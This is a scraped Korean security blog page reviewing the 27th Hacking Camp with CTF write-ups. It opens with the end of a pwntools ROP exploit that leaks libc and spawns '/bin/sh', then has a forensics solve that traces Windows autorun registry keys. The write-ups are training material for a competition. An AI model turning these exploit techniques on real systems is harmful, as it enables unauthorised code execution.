payload += pop_rdi + p64(elf.bss()) + ret + p64(elf.plt[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;write&amp;apos;&lt;/span&gt;])&lt;span class=&#34;hljs-comment&#34;&gt;# system(&amp;quot;/bin/sh&amp;quot;)&lt;/span&gt;

p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;Second Chance: &amp;apos;&lt;/span&gt;)
p.send(payload)

libc_base = u64(p.recv(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;)) - libc.sym[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;write&amp;apos;&lt;/span&gt;] &lt;span class=&#34;hljs-comment&#34;&gt;#write&lt;/span&gt;

p.send(p64(libc_base + libc.sym[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;system&amp;apos;&lt;/span&gt;]))
p.send(&lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;)

p.interactive()&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&#34;&gt;&lt;a href=&#34;#&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&#34;&gt;&lt;/a&gt;&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&lt;/h1&gt;&lt;p&gt;&amp;#xC138; &amp;#xBA85; &amp;#xBAA8;&amp;#xB450; &amp;#xCC98;&amp;#xC74C;&amp;#xC73C;&amp;#xB85C; &amp;#xCC38;&amp;#xC5EC;&amp;#xD558;&amp;#xB294; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC600;&amp;#xB294;&amp;#xB370;, &amp;#xCCAB; &amp;#xCC38;&amp;#xC5EC;&amp;#xC784;&amp;#xC5D0;&amp;#xB3C4; &amp;#xC5EC;&amp;#xB7EC; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC5D0; &amp;#xC801;&amp;#xADF9;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xCC38;&amp;#xC5EC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xBC30;&amp;#xB824;&amp;#xD574;&amp;#xC8FC;&amp;#xC2E0; &amp;#xB178;&amp;#xB825;&amp;#xB4E4;&amp;#xC774; &amp;#xB290;&amp;#xAEF4;&amp;#xC838; &amp;#xC990;&amp;#xAC81;&amp;#xAC8C; &amp;#xCC38;&amp;#xC5EC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB3D9;&amp;#xC544;&amp;#xB9AC;&amp;#xC6D0;&amp;#xB4E4;&amp;#xC774;&amp;#xB098; &amp;#xBCF4;&amp;#xC548;&amp;#xD558;&amp;#xB294; &amp;#xD6C4;&amp;#xBC30;&amp;#xB4E4;&amp;#xC5D0;&amp;#xAC8C; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC5D0; &amp;#xAF2D; &amp;#xCC38;&amp;#xC5EC;&amp;#xD574;&amp;#xBCF4;&amp;#xB77C;&amp;#xACE0; &amp;#xC801;&amp;#xADF9;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xCD94;&amp;#xCC9C;&amp;#xD558;&amp;#xACE0; &amp;#xC2F6;&amp;#xB124;&amp;#xC694; :)&lt;/p&gt;
&lt;p&gt;&amp;#xC88B;&amp;#xC740; &amp;#xAD50;&amp;#xB958;&amp;#xC758; &amp;#xC790;&amp;#xB9AC;&amp;#xB97C; &amp;#xB9C8;&amp;#xB828;&amp;#xD574;&amp;#xC8FC;&amp;#xC2E0; PoC Security, Demon&amp;#xD300;, SISS, &amp;#xD6C4;&amp;#xC6D0;&amp;#xC0AC; &amp;#xBC0F; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790; &amp;#xBD84;&amp;#xB4E4;&amp;#xC5D0;&amp;#xAC8C; &amp;#xAC10;&amp;#xC0AC;&amp;#xC758; &amp;#xB9D0;&amp;#xC500;&amp;#xC744; &amp;#xB4DC;&amp;#xB9BD;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/picture1.jpg&#34; alt=&#34;picture1&#34;&gt;&lt;/p&gt;
 - hack &amp; life">
  <meta property="og:image" content="https://hackyboiz.github.io2023/09/03/l0ch/hackingcamp_review/picture1.jpg">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2023/09/03/l0ch/hackingcamp_review/">

  <title>[Daily-Life] 27  Review&amp;Write-Up - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!--  -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!--  -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>


<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2023-09-03 22:00" pubdate>
      2023 9 3 
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      4.6k 
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      91
       
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Daily-Life] 27  Review&amp;Write-Up</h1>
            
            <div class="markdown-body" id="post-body">
              <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
              <!-- hackyboiz_horizen_index -->
              <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3672652207808168" data-ad-slot="8887862313" data-ad-format="auto" data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
              <h1 id="&#xB4E4;&#xC5B4;&#xAC00;&#xBA70;"><a href="#&#xB4E4;&#xC5B4;&#xAC00;&#xBA70;" class="headerlink" title="&#xB4E4;&#xC5B4;&#xAC00;&#xBA70;"></a>&#xB4E4;&#xC5B4;&#xAC00;&#xBA70;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! sstf write-up&#xC5D0; &#xC774;&#xC5B4; &#xD574;&#xD0B9;&#xCEA0;&#xD504; &#xB9AC;&#xBDF0; &#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
<p>&#xC9C0;&#xB09C; &#xB2EC; 8&#xC6D4; 26, 27&#xC77C; &#xC8FC;&#xB9D0; &#xB3D9;&#xC548; &#xD574;&#xD0A4;&#xBCF4;&#xC774;&#xC988; &#xD300;&#xC6D0; syru, pwndorei&#xC640; &#xD568;&#xAED8; 27&#xD68C; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xC5D0; &#xCC38;&#xC5EC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xB2E4;&#xC591;&#xD55C; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xD65C;&#xB3D9;&#xD558;&#xB294; &#xBCF4;&#xC548;&#xC778;&#xB4E4;&#xC758; &#xBC1C;&#xD45C;&#xB97C; &#xB4E3;&#xACE0;, &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xC5D0;&#xC11C; &#xC900;&#xBE44;&#xD574;&#xC8FC;&#xC2E0; CTF&#xB3C4; &#xC990;&#xAC81;&#xAC8C; &#xCC38;&#xC5EC;&#xD588;&#xB294;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD300;&#xC744; &#xB098;&#xB204;&#xC5B4; CTF&#xB3C4; &#xC9C4;&#xD589;&#xD588;&#xB294;&#xB370;, &#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xD300;&#xC73C;&#xB85C; &#xB098;&#xB258;&#xC5B4; &#xAC19;&#xC774; &#xD480;&#xC9C4; &#xBABB;&#xD588;&#xC9C0;&#xB9CC; &#xAC01;&#xC790;&#xC758; &#xD300;&#xC5D0;&#xC11C; &#xC990;&#xAC81;&#xAC8C; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5C8;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xD6C4;&#xAE30;&#xC640; &#xD568;&#xAED8; Write-Up&#xB97C; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<h1 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h1><h2 id="L0ch"><a href="#L0ch" class="headerlink" title="L0ch"></a>L0ch</h2><p>&#xC5BC;&#xB9C8; &#xC804; &#xD574;&#xD0B9;&#xCEA0;&#xD504; &#xBC1C;&#xD45C;&#xC790; &#xBAA8;&#xC9D1;&#xC5D0; Hyper-V &#xAD00;&#xB828; &#xC5F0;&#xAD6C;&#xB97C; &#xC8FC;&#xC81C;&#xB85C; &#xC81C;&#xCD9C;&#xD55C; &#xC81C; &#xC544;&#xC820;&#xB2E4;&#xAC00; &#xC120;&#xC815;&#xB418;&#xC5B4; &#xBC1C;&#xD45C;&#xB9CC; &#xD574;&#xC57C;&#xC9C0; &#xC0DD;&#xAC01;&#xD588;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;</p>
<p>&#xADF8;&#xB7F0;&#xB370; &#xD300;&#xC6D0;&#xB4E4;&#xACFC; &#xB3D9;&#xC544;&#xB9AC; &#xD6C4;&#xBC30;&#xB4E4;&#xC774; &#xB2E4;&#xB4E4; &#xCC38;&#xC5EC;&#xD55C;&#xB2E4;&#xAE38;&#xB798; &#xCDE8;&#xC900;&#xC5D0; &#xD55C;&#xCC3D;&#xC778; &#xB54C;&#xC9C0;&#xB9CC; &#xC774;&#xB7F0; &#xAE30;&#xD68C;&#xB97C; &#xB193;&#xCE60; &#xC218; &#xC5C6;&#xC5B4; &#xCC38;&#xAC00;&#xC790;&#xB85C;&#xB3C4; &#xCC38;&#xC5EC;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xB124;&#xC694;. &#xB355;&#xBD84;&#xC5D0; <del>&#xC774;&#xC81C;&#xB294; &#xAC00;&#xBB3C;&#xAC00;&#xBB3C;&#xD55C;..</del>  &#xACE0;&#xB4F1;&#xD559;&#xC0DD; &#xC2DC;&#xC808; &#xC218;&#xD559;&#xC5EC;&#xD589; &#xAE30;&#xBD84;&#xB3C4; &#xB290;&#xB084; &#xC218; &#xC788;&#xC5C8;&#xACE0;, &#xD574;&#xD0B9;&#xC744; &#xCC98;&#xC74C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xC0C8;&#xB0B4;&#xAE30; &#xBD84;&#xB4E4;&#xBD80;&#xD130; &#xC5C4;&#xCCAD;&#xB09C; &#xC2E4;&#xB825;&#xC790; &#xBD84;&#xB4E4;&#xAE4C;&#xC9C0; &#xC5EC;&#xB7EC; &#xC0AC;&#xB78C;&#xB4E4;&#xC744; &#xB9CC;&#xB098; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xC790;&#xADF9;&#xC744; &#xBC1B;&#xB294; &#xACC4;&#xAE30;&#xAC00; &#xB41C; &#xC88B;&#xC740; &#xACBD;&#xD5D8;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;! </p>
<h2 id="syru"><a href="#syru" class="headerlink" title="syru"></a>syru</h2><p>&#xBC1C;&#xD45C;&#xC790;&#xB85C; &#xC9C0;&#xC6D0;&#xD588;&#xC9C0;&#xB9CC;, &#xC694;&#xBC88;&#xC5D0;&#xB3C4; &#xC2E4;&#xD328;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB098;&#xC911;&#xC5D0; &#xBC1C;&#xD45C; &#xB77C;&#xC778;&#xC5C5;&#xC744; &#xBCF4;&#xB2C8; &#xC81C;&#xAC00; &#xC591;&#xBCF4;&#xD574;&#xC57C; &#xD588;&#xB358; &#xAD6D;&#xB0B4;&#xC678;&#xB85C; &#xC778;&#xC815;&#xBC1B;&#xB294; &#xD654;&#xB824;&#xD55C; &#xBCF4;&#xC548;&#xC778; &#xB4E4;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC5C8;&#xACE0; &#xC6B0;&#xB9AC; &#xD300;&#xC7A5;&#xC758; &#xBC1C;&#xD45C;&#xB3C4; &#xB4E4;&#xC744; &#xACB8; &#xCC38;&#xC5EC;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xC624;&#xC790;&#xB9C8;&#xC790; &#xB180;&#xB790;&#xB358; &#xAC83;&#xC740; &#xC815;&#xB9D0; &#xC5B4;&#xB9B0; &#xCE5C;&#xAD6C;&#xB4E4;&#xC774; &#xC77C;&#xCC0D;&#xBD80;&#xD130; &#xBCF4;&#xC548;&#xC758; &#xAD00;&#xC2EC;&#xC774; &#xB9CE;&#xB354;&#xB77C;&#xACE0;&#xC694;. &#xC800;&#xB294; &#xC911;&#xD559;&#xAD50; &#xB098;&#xC774; &#xB54C; &#xCE5C;&#xAD6C;&#xB4E4;&#xC774;&#xB791; &#xC720;x&#xC655;&#xCE74;&#xB4DC;&#xB97C; &#xD558;&#xBA70; &#xC9C0;&#xB0C8;&#xB358; &#xAC83; &#xAC19;&#xC740;&#xB370; &#xC5EC;&#xB7EC; &#xB300;&#xD68C;&#xB3C4; &#xB098;&#xAC00;&#xACE0; &#xD63C;&#xC790; &#xBCF4;&#xC548; &#xC5F0;&#xAD6C;&#xB3C4; &#xC9C4;&#xD589;&#xD588;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xB4E3;&#xACE0; &#xB300;&#xB2E8;&#xD558;&#xB2E4;&#xACE0; &#xB290;&#xAF08;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; &#xB098;&#xC774;&#xB97C; &#xB9CE;&#xC774; &#xBA39;&#xC740; &#xC81C;&#xAC00; &#xC624;&#xAE30;&#xC5D4; &#xD55C;&#xBC88;&#xC774; &#xC801;&#xB2F9;&#xD55C; &#xAC83; &#xAC19;&#xACE0; &#xC774;&#xC81C; &#xB9C9; &#xBCF4;&#xC548;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xD639;&#xC740; &#xB3D9;&#xC544;&#xB9AC;&#xC5D0;&#xC11C; &#xBCF4;&#xC548;&#xC5D0; &#xAD00;&#xC2EC;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xB354; &#xB9CE;&#xC740; &#xAE38;&#xC744; &#xAC77;&#xACE0; &#xC2F6;&#xC5B4; &#xD558;&#xB294; &#xD6C4;&#xBC30;&#xB4E4;&#xC5D0;&#xAC8C; &#xCD94;&#xCC9C;&#xD574;&#xC8FC;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xB3D9;&#xC544;&#xB9AC; &#xB0B4;&#xBD80;CTF&#xC5D0; &#xC0C1;&#xD488;&#xC73C;&#xB85C; &#xAC78;&#xAE4C;&#xB3C4; &#xC0DD;&#xAC01; &#xC911;&#xC774;&#xACE0;&#xC694;.</p>
<p>&#xC88B;&#xC740; &#xBC1C;&#xD45C; &#xC798; &#xB4E4;&#xC5C8;&#xACE0; 28&#xD68C;&#xC5D0;&#xB294; &#xBC1C;&#xD45C;&#xC790;&#xB85C; &#xCC38;&#xAC00;&#xD558;&#xAE38; &#xAE30;&#xB300;&#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xBCF4;&#xC548; &#xC5F0;&#xAD6C;&#xB97C; &#xC774;&#xC5B4; &#xB098;&#xAC00; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h2 id="pwndorei"><a href="#pwndorei" class="headerlink" title="pwndorei"></a>pwndorei</h2><p>&#xC6D0;&#xB798;&#xB294; &#xBC1C;&#xD45C;&#xC790;&#xB85C; &#xC9C0;&#xC6D0;&#xD588;&#xC9C0;&#xB9CC; &#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xB5A8;&#xC5B4;&#xC9C0;&#xBA74;&#xC11C; &#xB2E4;&#xC74C; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xC5D0; &#xBC1C;&#xD45C;&#xC790;&#xB85C; &#xC9C0;&#xC6D0;&#xD560; &#xB54C; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xC758; &#xBD84;&#xC704;&#xAE30;&#xB098; &#xC9C4;&#xD589; &#xBC29;&#xC2DD;&#xC744; &#xC54C;&#xBA74; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xACE0; &#xB2E4;&#xB978; &#xBC1C;&#xD45C;&#xC790;&#xBD84;&#xB4E4;&#xC758; &#xC8FC;&#xC81C;&#xAC00; &#xB108;&#xBB34; &#xB9E4;&#xB825;&#xC801;&#xC774;&#xC5B4;&#xC11C; &#xCC38;&#xAC00;&#xC790;&#xB85C; &#xB2E4;&#xC2DC; &#xC9C0;&#xC6D0;&#xD558;&#xC5EC; &#xCC38;&#xAC00;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;! </p>
<p>&#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xBC1C;&#xD45C;&#xC790;&#xC640; &#xCC38;&#xC5EC;&#xC790; &#xD3C9;&#xADE0; &#xC5F0;&#xB839;&#xC774; &#xB0AE;&#xC544;&#xC11C; &#xB180;&#xB790;&#xACE0; &#xC5B4;&#xB9B0; &#xB098;&#xC774;&#xC5D0; &#xD558;&#xACE0; &#xC2F6;&#xC740; &#xBD84;&#xC57C;&#xC5D0; &#xBAB0;&#xB450;&#xD558;&#xB294; &#xBAA8;&#xC2B5;&#xC774; &#xC815;&#xB9D0; &#xBA4B;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC911;&#xACE0;&#xB4F1;&#xD559;&#xAD50;&#xC758; &#xD559;&#xC5C5;&#xACFC; &#xD574;&#xD0B9; &#xACF5;&#xBD80;&#xB97C; &#xBCD1;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xC774;&#xB7F0; &#xD589;&#xC0AC;&#xC5D0; &#xCC38;&#xC5EC;&#xD558;&#xB294; &#xC5F4;&#xC815;&#xC740; &#xC800;&#xB3C4; &#xBCF8;&#xBC1B;&#xC544;&#xC57C; &#xD560; &#xAC83; &#xAC19;&#xB354;&#xAD70;&#xC694;. &#xC591;&#xC9C8;&#xC758; &#xBC1C;&#xD45C;&#xB4E4;&#xC744; &#xD1B5;&#xD574; &#xB2E4;&#xC591;&#xD55C; &#xBD84;&#xC57C;&#xC758; &#xC9C0;&#xC2DD;&#xB4E4;&#xC744; &#xC5BB;&#xC5C8;&#xC73C;&#xB2C8; &#xB2E4;&#xC74C; &#xD574;&#xD0B9;&#xCEA0;&#xD504;&#xC5D0;&#xC11C; &#xBC1B;&#xC740; &#xB9CC;&#xD07C; &#xB3CC;&#xB824;&#xB4DC;&#xB9B4; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xB178;&#xB825;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h1 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write-Up"></a>Write-Up</h1><h3 id="REGISTRIP-L0ch"><a href="#REGISTRIP-L0ch" class="headerlink" title="REGISTRIP - L0ch"></a>REGISTRIP - L0ch</h3><p><img src="/2023/09/03/l0ch/hackingcamp_review/Untitled.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p>&#xD3EC;&#xB80C;&#xC2DD; &#xBB38;&#xC81C;&#xB85C;, Description&#xC744; &#xBCF4;&#xBA74; &#xD0A4;&#xC6CC;&#xB4DC;&#xAC00; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xBB38;&#xC81C;&#xC758; &#xD0A4;&#xC6CC;&#xB4DC;&#xB294; automatically run &#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;.</p>
<p>&#xADF8;&#xB7FC; &#xC81C;&#xACF5;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2023/09/03/l0ch/hackingcamp_review/Untitled%201.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p>Windows &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD558;&#xC774;&#xBE0C; &#xD30C;&#xC77C;&#xC784;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xAC00; &#xBCF4;&#xD1B5; &#xC544;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xB294; regedit &#xD3B8;&#xC9D1;&#xAE30;&#xB85C; &#xBCF4;&#xB294; &#xD2B8;&#xB9AC;&#xAC00; &#xC775;&#xC219;&#xD55C;&#xB370;&#xC694;, &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xBD84;&#xC11D; &#xD234; REGA&#xC778; &#xC0AC;&#xC6A9;&#xD574; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xC775;&#xC219;&#xD55C; &#xD2B8;&#xB9AC; &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
<p><img src="/2023/09/03/l0ch/hackingcamp_review/Untitled%202.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p><img src="/2023/09/03/l0ch/hackingcamp_review/Untitled%203.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p>&#xC774;&#xC81C;&#xC57C; &#xC880; &#xBD84;&#xC11D;&#xD560; &#xB9DB;&#xC774; &#xB098;&#xB124;&#xC694;!</p>
<p>Windows Registry + Automatically Run &#xD0A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xBA74;, &#xBB38;&#xC81C; &#xCEE8;&#xC149;&#xC740; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xC545;&#xC6A9;&#xB418;&#xB294; auto run &#xAD00;&#xB828; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xC778; &#xAC83;&#xC744; &#xC0DD;&#xAC01;&#xD574; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xB4E4;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xB2E8;&#xC11C;&#xAC00; &#xC788;&#xC744; &#xAC83; &#xAC19;&#xB124;&#xC694;.</p>
<p>Auto Run&#xACFC; &#xAD00;&#xB828;&#xB41C; Windows &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xB294; &#xC6B0;&#xC120; &#xC774;&#xC815;&#xB3C4;&#xB85C; &#xC0DD;&#xAC01;&#xD574; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<ol>
<li><code>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
<li><code>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></li>
</ol>
<p>&#xD574;&#xB2F9; &#xD0A4;&#xB4E4;&#xC758; value&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC218;&#xC0C1;&#xD55C; &#xAC12;&#xB4E4;&#xC774; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2023/09/03/l0ch/hackingcamp_review/Untitled%204.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p><code>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> </p>
<p>1 : 7cf7a9d2d0</p>
<p><img src="/2023/09/03/l0ch/hackingcamp_review/Untitled%205.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p><code>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code></p>
<p>2 : ac21fb716b</p>
<p><img src="/2023/09/03/l0ch/hackingcamp_review/Untitled%206.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p><code>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></p>
<p>3 : 1e032c79c4</p>
<pre><code class="hljs vbnet">Here<span class="hljs-comment">&apos;s the hint for the last fragment. </span>
<span class="hljs-string">&quot;Every time I run Notepad, a strange file runs with it...&quot;</span></code></pre>
<p>&#xC138; &#xBC88;&#xC9F8; value Data&#xC5D0; &#xCD94;&#xAC00; &#xD78C;&#xD2B8;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>Notepad&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xC774;&#xC0C1;&#xD55C; &#xD30C;&#xC77C;&#xC774; &#xAC19;&#xC774; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;&#xACE0; &#xD558;&#xB294;&#xB370;, &#xC774;&#xAC83;&#xC774; &#xB9C8;&#xC9C0;&#xB9C9; fragment&#xC778; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
